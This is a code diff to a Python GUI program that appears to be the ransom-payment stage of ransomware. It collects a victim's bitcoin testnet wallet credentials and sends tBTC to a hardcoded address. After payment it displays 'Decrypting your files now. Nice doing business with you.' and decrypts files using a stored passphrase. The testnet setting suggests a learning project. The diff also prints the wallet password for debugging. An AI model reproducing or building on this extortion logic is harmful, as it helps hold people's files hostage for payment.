@@ -10,14 +10,12 @@ from extract import extract_file
 def clicking_submit():
     global round
 
-    # Performs the model logic associated with opening a testnet wallet
     if round == 1:
         wallet_name: str = response_entry1.get()
         wallet_password: str = response_entry2.get()
         # TODO: Get rid of print statements in final product. Just for debugging purposes
         print(wallet_name)
         print(wallet_password)
-
         # If user provides input for an existing bitcoin wallet, moves on to next round
         if wallet_exists(wallet_name):
             global wallet
@@ -56,7 +54,7 @@ def clicking_submit():
 
             round += 1
 
-            # Transition to the next round
+            # Transitions to the next round
             for widget in window.winfo_children():
                 if widget != image_label:
                     widget.destroy()
@@ -114,17 +112,14 @@ def setup_round_2():
                             submit_button]
 
 def setup_round_3():
-    # The address of my testnet bitcoin wallet
-    #receiver_address: str = "tb1q502wsjnar03w82u56cxrn7yhrltc5w6kzxfrz9"
     receiver_address: str = "tb1q8fwk4r7tvt5zm6xc40ucd5mljesdj2jyt5hpea"
     wallet.utxos_update()
     try:
-        # Carries out the transaction
-        wallet_transaction = wallet.send_to(receiver_address, amount_to_send, network="testnet", fee=1000)
+        wallet_transaction = wallet.send_to(receiver_address, amount_to_send, network="testnet", fee=1000, broadcast=True)
     except Exception as e:
         print(f"Transaction failed: {e}")
         return
-    # Query transaction details
+    # Queries transaction details
     try:
         service = Service(network="testnet")
         transaction_details = service.gettransaction(wallet_transaction.txid)
@@ -133,22 +128,18 @@ def setup_round_3():
             # The transaction was not found or failed
             print("Transaction details could not be retrieved. Please verify the transaction ID.")
             return
-
         if isinstance(transaction_details, bitcoinlib.transactions.Transaction):
             # Extract outputs and check if the transaction is successful
             print(f"Transaction retrieved successfully: {transaction_details}")
             for output in transaction_details.outputs:
                 if output['address'] == receiver_address:
                     print(f"Transaction successful! Sent {amount_to_send} tBTC to {receiver_address}")
-
                     transaction_details_label = Label(text="Transaction successful", fg="blue")
                     transaction_details_label.pack()
-
                     successful_transaction_label = Label(
                         text="Decrypting your files now. Nice doing business with you. :)",
                         fg="green")
                     successful_transaction_label.pack()
-
                     import os
                     # Extracts the key from a specified image
                     with open("passphrase.txt", "r") as file:
@@ -174,9 +165,6 @@ def setup_round_3():
                     except FileNotFoundError as fnfe:
                         print(f"File Not Found: {fnfe}")
                         return
-            print("Receiver address not found in transaction outputs.")
-        else:
-            print("Unexpected transaction details type returned.")
     except Exception as e:
         print(f"Failed to retrieve transaction details: {e}")
 
